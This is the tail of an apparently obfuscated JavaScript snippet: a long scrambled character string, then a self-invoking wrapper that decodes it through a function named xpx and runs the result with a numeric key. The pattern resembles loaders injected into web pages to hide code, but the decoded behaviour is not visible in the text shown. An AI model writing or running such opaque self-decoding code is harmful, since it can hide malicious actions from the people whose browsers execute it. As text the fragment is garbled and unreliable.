(CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
